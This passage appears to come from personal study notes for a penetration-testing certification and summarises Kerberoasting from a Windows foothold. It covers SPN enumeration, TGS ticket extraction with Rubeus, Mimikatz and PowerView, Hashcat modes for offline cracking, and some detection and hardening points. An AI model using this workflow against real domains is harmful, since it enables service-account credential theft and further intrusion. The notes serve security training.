> Ticket material
>  ↓
> Crackable representation
>  ↓
> Password
> ```
> 
> The tools simply automate different portions of this pipeline.

### The most important concepts:

1. **SPNs identify services associated with accounts.**
    
2. **User/service accounts with SPNs are potential Kerberoasting targets.**
    
3. **A valid domain context allows a TGS to be requested for an SPN.**
    
4. **The TGS can be extracted and processed offline.**
    
5. **The service account's password is what we ultimately try to recover.**
    
6. **RC4 type `23` is substantially faster to crack than AES in the examples.**
    
7. **AES does not make Kerberoasting impossible; it increases cracking cost.**
    
8. **`msDS-SupportedEncryptionTypes` helps identify the account's supported encryption configuration.**
    
9. **Rubeus `/stats` lets you enumerate targets before requesting tickets.**
    
10. **`admincount=1` can be used as an LDAP filter to narrow the target set.**
    
11. **`/nowrap` makes long Rubeus hashes easier to copy into offline cracking tools.**
    
12. **Domain Controller version matters when considering encryption-type downgrade behavior.**
    
13. **The manual method is valuable because it exposes what automated tools are doing underneath.**
    

---

# 🧠 34. One-Sentence Mental Model

> [!success] 🎯 Remember This  
> **Kerberoasting from Windows is the process of finding service-account SPNs, requesting their Kerberos TGS tickets using your existing Windows/domain context, extracting the ticket material, and then attempting to recover the service-account password offline — with RC4 tickets generally being much faster to crack than AES tickets.**

---

# 📌 35. Key Takeaways

|Concept|Remember|
|---|---|
|`setspn.exe`|Find SPNs|
|SPN|Identifies a Kerberos service|
|User SPN account|Potential Kerberoasting target|
|`KerberosRequestorSecurityToken`|Manually request a TGS|
|Mimikatz|Extract Kerberos tickets from memory|
|`.kirbi`|Kerberos ticket file format|
|`kirbi2john.py`|Convert ticket material for cracking workflow|
|PowerView|AD enumeration + convenient TGS extraction|
|Rubeus|Powerful Windows Kerberos toolkit|
|`/stats`|Enumerate Kerberoastable accounts without requesting tickets|
|`/ldapfilter:'admincount=1'`|Narrow targets to accounts matching `admincount=1`|
|`/nowrap`|Keep long output on one line|
|EType `23`|RC4-HMAC|
|EType `17`|AES128|
|EType `18`|AES256|
|Hashcat `13100`|Kerberos 5 etype 23 TGS-REP|
|Hashcat `19700`|Kerberos 5 etype 18 TGS-REP|
|`msDS-SupportedEncryptionTypes`|Helps identify supported Kerberos encryption configuration|
|Event `4769`|Kerberos service ticket requested|
|Event `4770`|Kerberos service ticket renewed|
|MSA/gMSA|Reduce risk from manually managed service-account passwords|
|Strong passwords|Make offline TGS cracking much harder|

> [!success] 🏁 CPTS Big Picture
> 
> ```text
>                 WINDOWS DOMAIN FOOTHOLD
>                          │
>                          ▼
>                    ENUMERATE SPNs
>                          │
>             ┌────────────┼────────────┐
>             ▼            ▼            ▼
>          setspn       PowerView     Rubeus
>             │            │            │
>             └────────────┼────────────┘
>                          ▼
>                  IDENTIFY TARGETS
>                          │
>                 ┌────────┴────────┐
>                 ▼                 ▼
>               RC4                AES
>             Type 23           Type 17/18
>                 │                 │
>                 ▼                 ▼
>             TGS REQUEST        TGS REQUEST
>                 │                 │
>                 └────────┬────────┘
>                          ▼
>                    EXTRACT HASH
>                          │
>                          ▼
>                       HASHCAT
>                          │
>                          ▼
>                  PASSWORD RECOVERY
>                          │
>                          ▼
>                 VALIDATE CREDENTIALS
>                          │
>                          ▼
>                 CONTINUE AD ATTACK PATH
> ```